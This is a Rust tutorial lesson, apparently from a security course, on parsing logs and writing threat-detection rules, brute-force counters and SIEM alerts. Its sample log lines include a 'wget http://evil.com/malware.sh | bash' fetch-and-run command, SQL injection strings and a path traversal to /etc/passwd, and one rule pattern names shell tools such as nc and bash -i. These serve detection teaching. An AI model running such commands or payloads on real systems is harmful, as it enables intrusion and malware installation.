# Log Analysis in Rust

## Overview

Log analysis is fundamental to threat detection. This lesson covers parsing, analyzing, and alerting on security-relevant log events.

---

## Learning Objectives

- Parse common log formats (syslog, JSON, Apache/Nginx)
- Implement pattern matching for threat detection
- Build aggregation and correlation logic
- Generate alerts and reports
- Handle large log files efficiently

---

## Log Format Basics

### Common Formats

```
# Syslog (RFC 3164)
Jan 15 10:30:45 webserver sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2

# Apache Combined Log Format
192.168.1.100 - - [15/Jan/2024:10:30:45 +0000] "GET /admin HTTP/1.1" 404 512 "-" "Mozilla/5.0"

# JSON (Structured Logging)
{"timestamp":"2024-01-15T10:30:45Z","level":"ERROR","source":"sshd","message":"Failed password","user":"admin","ip":"192.168.1.100"}

# Windows Event Log (exported)
<Event><TimeCreated SystemTime="2024-01-15T10:30:45Z"/><EventID>4625</EventID></Event>
```

---

## Basic Log Parser

### Syslog Parser

```rust
use chrono::{DateTime, NaiveDateTime, Utc};
use regex::Regex;

#[derive(Debug)]
struct SyslogEntry {
    timestamp: String,
    hostname: String,
    program: String,
    pid: Option<u32>,
    message: String,
}

fn parse_syslog(line: &str) -> Option<SyslogEntry> {
    // Pattern: "Jan 15 10:30:45 hostname program[pid]: message"
    let re = Regex::new(
        r"^(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\w+)(?:\[(\d+)\])?:\s+(.+)$"
    ).ok()?;

    let caps = re.captures(line)?;

    Some(SyslogEntry {
        timestamp: caps.get(1)?.as_str().to_string(),
        hostname: caps.get(2)?.as_str().to_string(),
        program: caps.get(3)?.as_str().to_string(),
        pid: caps.get(4).and_then(|m| m.as_str().parse().ok()),
        message: caps.get(5)?.as_str().to_string(),
    })
}

fn main() {
    let log_lines = vec![
        "Jan 15 10:30:45 webserver sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2",
        "Jan 15 10:30:46 webserver sshd[1234]: Accepted password for root from 10.0.0.1 port 22 ssh2",
        "Jan 15 10:30:47 webserver kernel: Out of memory: Kill process 5678",
    ];

    for line in log_lines {
        if let Some(entry) = parse_syslog(line) {
            println!("{:?}", entry);
        }
    }
}
```

### JSON Log Parser

```rust
use serde::{Deserialize, Serialize};
use serde_json;

#[derive(Debug, Deserialize, Serialize)]
struct JsonLogEntry {
    timestamp: String,
    level: String,
    source: String,
    message: String,
    #[serde(flatten)]
    extra: std::collections::HashMap<String, serde_json::Value>,
}

fn parse_json_log(line: &str) -> Option<JsonLogEntry> {
    serde_json::from_str(line).ok()
}

fn main() {
    let logs = vec![
        r#"{"timestamp":"2024-01-15T10:30:45Z","level":"ERROR","source":"auth","message":"Login failed","user":"admin","ip":"192.168.1.100"}"#,
        r#"{"timestamp":"2024-01-15T10:30:46Z","level":"INFO","source":"auth","message":"Login success","user":"john"}"#,
    ];

    for log in logs {
        if let Some(entry) = parse_json_log(log) {
            println!("Level: {}, Source: {}, Message: {}",
                entry.level, entry.source, entry.message);

            if let Some(ip) = entry.extra.get("ip") {
                println!("  IP: {}", ip);
            }
        }
    }
}
```

---

## Threat Detection Rules

### Pattern-Based Detection

```rust
use regex::Regex;
use std::collections::HashMap;

#[derive(Debug)]
enum ThreatLevel {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug)]
struct DetectionRule {
    name: String,
    pattern: Regex,
    level: ThreatLevel,
    description: String,
}

#[derive(Debug)]
struct Alert {
    rule_name: String,
    level: ThreatLevel,
    log_line: String,
    matched_text: String,
}

struct LogAnalyzer {
    rules: Vec<DetectionRule>,
}

impl LogAnalyzer {
    fn new() -> Self {
        let rules = vec![
            DetectionRule {
                name: "SSH_BRUTE_FORCE".to_string(),
                pattern: Regex::new(r"Failed password for .* from (\d+\.\d+\.\d+\.\d+)").unwrap(),
                level: ThreatLevel::Medium,
                description: "SSH authentication failure".to_string(),
            },
            DetectionRule {
                name: "SSH_ROOT_LOGIN".to_string(),
                pattern: Regex::new(r"Accepted .* for root from").unwrap(),
                level: ThreatLevel::High,
                description: "Root login detected".to_string(),
            },
            DetectionRule {
                name: "INVALID_USER".to_string(),
                pattern: Regex::new(r"Invalid user (\S+) from").unwrap(),
                level: ThreatLevel::Medium,
                description: "Login attempt with invalid username".to_string(),
            },
            DetectionRule {
                name: "SQL_INJECTION".to_string(),
                pattern: Regex::new(r"(?i)(union\s+select|or\s+1=1|'\s*or\s*')").unwrap(),
                level: ThreatLevel::Critical,
                description: "Possible SQL injection attempt".to_string(),
            },
            DetectionRule {
                name: "PATH_TRAVERSAL".to_string(),
                pattern: Regex::new(r"\.\./|\.\.\\").unwrap(),
                level: ThreatLevel::High,
                description: "Path traversal attempt".to_string(),
            },
            DetectionRule {
                name: "COMMAND_INJECTION".to_string(),
                pattern: Regex::new(r"[;&|`$]").unwrap(),
                level: ThreatLevel::Critical,
                description: "Possible command injection".to_string(),
            },
        ];

        Self { rules }
    }

    fn analyze(&self, log_line: &str) -> Vec<Alert> {
        let mut alerts = Vec::new();

        for rule in &self.rules {
            if let Some(caps) = rule.pattern.captures(log_line) {
                alerts.push(Alert {
                    rule_name: rule.name.clone(),
                    level: match rule.level {
                        ThreatLevel::Low => ThreatLevel::Low,
                        ThreatLevel::Medium => ThreatLevel::Medium,
                        ThreatLevel::High => ThreatLevel::High,
                        ThreatLevel::Critical => ThreatLevel::Critical,
                    },
                    log_line: log_line.to_string(),
                    matched_text: caps.get(0).map(|m| m.as_str().to_string())
                        .unwrap_or_default(),
                });
            }
        }

        alerts
    }
}

fn main() {
    let analyzer = LogAnalyzer::new();

    let test_logs = vec![
        "Jan 15 10:30:45 server sshd[1234]: Failed password for invalid user admin from 192.168.1.100",
        "Jan 15 10:31:00 server sshd[1234]: Accepted password for root from 10.0.0.1",
        "192.168.1.100 - - [15/Jan/2024:10:30:45] \"GET /page?id=1' OR '1'='1 HTTP/1.1\" 200",
        "192.168.1.100 - - [15/Jan/2024:10:30:46] \"GET /files/../../../etc/passwd HTTP/1.1\" 403",
    ];

    for log in test_logs {
        let alerts = analyzer.analyze(log);

        if !alerts.is_empty() {
            println!("\n=== Log Line ===");
            println!("{}", log);
            for alert in alerts {
                println!("  [{:?}] {} - {}", alert.level, alert.rule_name, alert.matched_text);
            }
        }
    }
}
```

---

## Aggregation and Statistics

### Failed Login Counter

```rust
use std::collections::HashMap;
use std::time::{Duration, Instant};
use regex::Regex;

struct FailedLoginTracker {
    attempts: HashMap<String, Vec<Instant>>,
    threshold: usize,
    window: Duration,
}

impl FailedLoginTracker {
    fn new(threshold: usize, window_seconds: u64) -> Self {
        Self {
            attempts: HashMap::new(),
            threshold,
            window: Duration::from_secs(window_seconds),
        }
    }

    fn record_failure(&mut self, ip: &str) -> Option<String> {
        let now = Instant::now();

        let attempts = self.attempts.entry(ip.to_string()).or_insert_with(Vec::new);

        // Remove old attempts outside the window
        attempts.retain(|&t| now.duration_since(t) < self.window);

        // Add new attempt
        attempts.push(now);

        // Check threshold
        if attempts.len() >= self.threshold {
            return Some(format!(
                "BRUTE FORCE DETECTED: {} has {} failed attempts in {:?}",
                ip, attempts.len(), self.window
            ));
        }

        None
    }

    fn extract_ip(log_line: &str) -> Option<String> {
        let re = Regex::new(r"from\s+(\d+\.\d+\.\d+\.\d+)").ok()?;
        re.captures(log_line)?
            .get(1)
            .map(|m| m.as_str().to_string())
    }
}

fn main() {
    let mut tracker = FailedLoginTracker::new(3, 60);  // 3 failures in 60 seconds

    let logs = vec![
        "Failed password for admin from 192.168.1.100 port 22",
        "Failed password for root from 192.168.1.100 port 22",
        "Failed password for admin from 10.0.0.50 port 22",
        "Failed password for user from 192.168.1.100 port 22",  // 3rd attempt - alert!
        "Failed password for test from 192.168.1.100 port 22",
    ];

    for log in logs {
        if log.contains("Failed password") {
            if let Some(ip) = FailedLoginTracker::extract_ip(log) {
                if let Some(alert) = tracker.record_failure(&ip) {
                    println!("[ALERT] {}", alert);
                } else {
                    println!("[INFO] Failed login from {}", ip);
                }
            }
        }
    }
}
```

### Traffic Statistics

```rust
use std::collections::HashMap;

#[derive(Default)]
struct TrafficStats {
    total_requests: u64,
    by_ip: HashMap<String, u64>,
    by_status: HashMap<u16, u64>,
    by_path: HashMap<String, u64>,
    bytes_transferred: u64,
}

impl TrafficStats {
    fn add_request(&mut self, ip: &str, path: &str, status: u16, bytes: u64) {
        self.total_requests += 1;
        self.bytes_transferred += bytes;

        *self.by_ip.entry(ip.to_string()).or_insert(0) += 1;
        *self.by_status.entry(status).or_insert(0) += 1;
        *self.by_path.entry(path.to_string()).or_insert(0) += 1;
    }

    fn top_ips(&self, n: usize) -> Vec<(&String, &u64)> {
        let mut ips: Vec<_> = self.by_ip.iter().collect();
        ips.sort_by(|a, b| b.1.cmp(a.1));
        ips.into_iter().take(n).collect()
    }

    fn error_rate(&self) -> f64 {
        let errors: u64 = self.by_status.iter()
            .filter(|(code, _)| **code >= 400)
            .map(|(_, count)| count)
            .sum();

        if self.total_requests > 0 {
            errors as f64 / self.total_requests as f64 * 100.0
        } else {
            0.0
        }
    }

    fn report(&self) {
        println!("=== Traffic Statistics ===");
        println!("Total requests: {}", self.total_requests);
        println!("Total bytes: {}", self.bytes_transferred);
        println!("Error rate: {:.2}%", self.error_rate());

        println!("\nTop IPs:");
        for (ip, count) in self.top_ips(5) {
            println!("  {}: {} requests", ip, count);
        }

        println!("\nStatus codes:");
        for (status, count) in &self.by_status {
            println!("  {}: {}", status, count);
        }
    }
}

fn main() {
    let mut stats = TrafficStats::default();

    // Simulated log data
    let requests = vec![
        ("192.168.1.100", "/index.html", 200, 1024),
        ("192.168.1.100", "/api/users", 200, 512),
        ("10.0.0.50", "/admin", 403, 128),
        ("192.168.1.100", "/images/logo.png", 200, 4096),
        ("10.0.0.50", "/login", 200, 256),
        ("172.16.0.1", "/api/data", 500, 64),
    ];

    for (ip, path, status, bytes) in requests {
        stats.add_request(ip, path, status, bytes);
    }

    stats.report();
}
```

---

## Complete Log Analyzer

```rust
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::collections::HashMap;
use regex::Regex;

// Detection rule
struct Rule {
    name: String,
    pattern: Regex,
    severity: u8,
}

// Alert generated by rule match
struct Alert {
    rule: String,
    severity: u8,
    source_ip: Option<String>,
    log_line: String,
    timestamp: String,
}

// Statistics tracker
struct Stats {
    lines_processed: u64,
    alerts_generated: u64,
    by_rule: HashMap<String, u64>,
    by_ip: HashMap<String, u64>,
}

struct LogAnalyzer {
    rules: Vec<Rule>,
    stats: Stats,
    ip_pattern: Regex,
}

impl LogAnalyzer {
    fn new() -> Self {
        let rules = vec![
            Rule {
                name: "AUTH_FAILURE".to_string(),
                pattern: Regex::new(r"(?i)(failed|invalid|denied|rejected).*(password|login|auth)").unwrap(),
                severity: 5,
            },
            Rule {
                name: "ROOT_ACCESS".to_string(),
                pattern: Regex::new(r"(?i)(root|admin|administrator).*(login|access|session)").unwrap(),
                severity: 7,
            },
            Rule {
                name: "INJECTION_ATTEMPT".to_string(),
                pattern: Regex::new(r"(?i)(union\s+select|<script|\.\./)").unwrap(),
                severity: 9,
            },
            Rule {
                name: "SUSPICIOUS_COMMAND".to_string(),
                pattern: Regex::new(r"(?i)(wget|curl|nc|bash\s+-i|python\s+-c)").unwrap(),
                severity: 8,
            },
            Rule {
                name: "ERROR_SPIKE".to_string(),
                pattern: Regex::new(r"(?i)(error|exception|failed|critical)").unwrap(),
                severity: 4,
            },
        ];

        Self {
            rules,
            stats: Stats {
                lines_processed: 0,
                alerts_generated: 0,
                by_rule: HashMap::new(),
                by_ip: HashMap::new(),
            },
            ip_pattern: Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})").unwrap(),
        }
    }

    fn extract_ip(&self, line: &str) -> Option<String> {
        self.ip_pattern.captures(line)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string())
    }

    fn extract_timestamp(&self, line: &str) -> String {
        // Try to extract timestamp from common formats
        if line.len() >= 15 {
            line[0..15].to_string()
        } else {
            "unknown".to_string()
        }
    }

    fn analyze_line(&mut self, line: &str) -> Vec<Alert> {
        self.stats.lines_processed += 1;
        let mut alerts = Vec::new();

        for rule in &self.rules {
            if rule.pattern.is_match(line) {
                let ip = self.extract_ip(line);

                if let Some(ref ip) = ip {
                    *self.stats.by_ip.entry(ip.clone()).or_insert(0) += 1;
                }

                *self.stats.by_rule.entry(rule.name.clone()).or_insert(0) += 1;
                self.stats.alerts_generated += 1;

                alerts.push(Alert {
                    rule: rule.name.clone(),
                    severity: rule.severity,
                    source_ip: ip,
                    log_line: line.to_string(),
                    timestamp: self.extract_timestamp(line),
                });
            }
        }

        alerts
    }

    fn analyze_file(&mut self, path: &str) -> Result<Vec<Alert>, std::io::Error> {
        let file = File::open(path)?;
        let reader = BufReader::new(file);
        let mut all_alerts = Vec::new();

        for line in reader.lines() {
            if let Ok(line) = line {
                let alerts = self.analyze_line(&line);
                all_alerts.extend(alerts);
            }
        }

        Ok(all_alerts)
    }

    fn print_report(&self) {
        println!("\n{}", "=".repeat(60));
        println!("LOG ANALYSIS REPORT");
        println!("{}", "=".repeat(60));

        println!("\nSummary:");
        println!("  Lines processed: {}", self.stats.lines_processed);
        println!("  Alerts generated: {}", self.stats.alerts_generated);

        println!("\nAlerts by Rule:");
        let mut rules: Vec<_> = self.stats.by_rule.iter().collect();
        rules.sort_by(|a, b| b.1.cmp(a.1));
        for (rule, count) in rules {
            println!("  {}: {}", rule, count);
        }

        println!("\nTop Source IPs:");
        let mut ips: Vec<_> = self.stats.by_ip.iter().collect();
        ips.sort_by(|a, b| b.1.cmp(a.1));
        for (ip, count) in ips.iter().take(10) {
            println!("  {}: {} alerts", ip, count);
        }
    }
}

fn main() {
    let mut analyzer = LogAnalyzer::new();

    // Test with sample logs
    let sample_logs = vec![
        "Jan 15 10:30:45 server sshd[1234]: Failed password for admin from 192.168.1.100",
        "Jan 15 10:30:46 server sshd[1234]: Accepted password for root from 10.0.0.1",
        "Jan 15 10:30:47 server httpd: 192.168.1.100 \"GET /search?q=' UNION SELECT * FROM users-- HTTP/1.1\" 200",
        "Jan 15 10:30:48 server httpd: 10.0.0.50 \"GET /files/../../../etc/passwd HTTP/1.1\" 403",
        "Jan 15 10:30:49 server bash: wget http://evil.com/malware.sh | bash",
    ];

    println!("Analyzing sample logs...\n");

    for log in sample_logs {
        let alerts = analyzer.analyze_line(log);

        for alert in alerts {
            println!("[ALERT] Severity:{} Rule:{} IP:{:?}",
                alert.severity,
                alert.rule,
                alert.source_ip
            );
            println!("  Log: {}", alert.log_line);
        }
    }

    analyzer.print_report();
}
```

---

## Output to SIEM

### JSON Alert Format

```rust
use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize)]
struct SiemAlert {
    #[serde(rename = "@timestamp")]
    timestamp: String,
    event_type: String,
    severity: u8,
    source_ip: Option<String>,
    rule_name: String,
    raw_log: String,
    tags: Vec<String>,
}

impl SiemAlert {
    fn to_json(&self) -> String {
        serde_json::to_string(self).unwrap_or_default()
    }

    fn to_json_pretty(&self) -> String {
        serde_json::to_string_pretty(self).unwrap_or_default()
    }
}

fn main() {
    let alert = SiemAlert {
        timestamp: "2024-01-15T10:30:45Z".to_string(),
        event_type: "security_alert".to_string(),
        severity: 8,
        source_ip: Some("192.168.1.100".to_string()),
        rule_name: "SQL_INJECTION".to_string(),
        raw_log: "GET /search?q=' OR 1=1-- HTTP/1.1".to_string(),
        tags: vec!["injection".to_string(), "web".to_string()],
    };

    println!("{}", alert.to_json());
}
```

---

## Exercises

1. **Multi-format Parser**: Support Apache, Nginx, and JSON logs
2. **Real-time Monitor**: Use `notify` crate to watch log files
3. **Correlation Engine**: Detect multi-step attacks across logs
4. **Report Generator**: Create HTML reports with charts

---

## Key Takeaways

1. **Regex for pattern matching** - Core of detection rules
2. **Aggregation matters** - Single events vs patterns
3. **Threshold-based detection** - Count events over time
4. **Multiple output formats** - Support various SIEM integrations
5. **Performance for large logs** - Streaming, not loading all in memory

---

[← Back to Detection](./README.md) | [Next: IOC Scanning →](./02_IOC_Scanning.md)
